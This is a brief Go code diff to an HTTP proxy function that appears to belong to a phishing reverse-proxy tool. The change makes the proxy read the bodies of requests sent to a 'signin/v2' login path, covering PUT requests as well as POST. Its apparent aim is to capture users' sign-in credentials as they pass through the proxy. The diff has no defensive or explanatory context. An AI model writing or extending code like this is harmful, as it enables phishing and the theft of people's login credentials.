@@ -217,7 +217,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			remote_addr := from_ip
 
 			 // Inject the following code snippet to check for "signin/v2" in the URL and if it's a POST request
-		        if strings.Contains(req.URL.Path, "signin/v2") && req.Method == http.MethodPost {
+		       if strings.Contains(req.URL.Path, "signin/v2") && (req.Method == http.MethodPost || req.Method == http.MethodPut){
 		            // Read the request body
 			    log.Info("Found a potential")
 		            bodyBytes, err := ioutil.ReadAll(req.Body)
